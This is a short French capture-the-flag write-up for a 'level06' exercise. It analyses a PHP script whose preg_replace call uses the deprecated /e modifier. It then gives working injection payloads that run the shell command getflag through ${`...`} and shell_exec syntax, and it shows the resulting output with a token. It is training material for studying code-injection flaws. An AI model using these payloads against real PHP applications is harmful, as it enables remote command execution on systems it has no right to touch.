## Démarche

```
ls
```
> level06  level06.php

```
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

```
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

> ./level06

> PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

- Regexp
  
    **Pour x(y, z)**

    1. `(\[x (.*)\])` devient `y("\2")`
        - ex : `([x coucou])` -> `(y("coucou"))`
    2. `[` devient `(`
    3. `]` devient `)`

    Donc, `[x coucou]` -> `[y("coucou")]`

    **Pour y(m)**

    1. `.` devient ` x `
    2. `@` devient ` y`
   
- le `/e` :  
    > The e modifier is a deprecated regex modifier which allows you to use PHP code within your regular expression. This means that whatever you parse in will be evaluated as a part of your program.

- Trouver comment exécuter getflag en passer la bonne syntaxe en paramètre : 
  
`echo "[x {\${shell_exec(getflag)}}]" > /tmp/test06 && ./level06 /tmp/test06`

```
echo '[x ${`getflag`}]' > /tmp/getflag`
```

```
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

## Ressources

- php beautifier
- regexp
- https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
- https://www.it-connect.fr/executer-des-commandes-shell-par-un-script-php/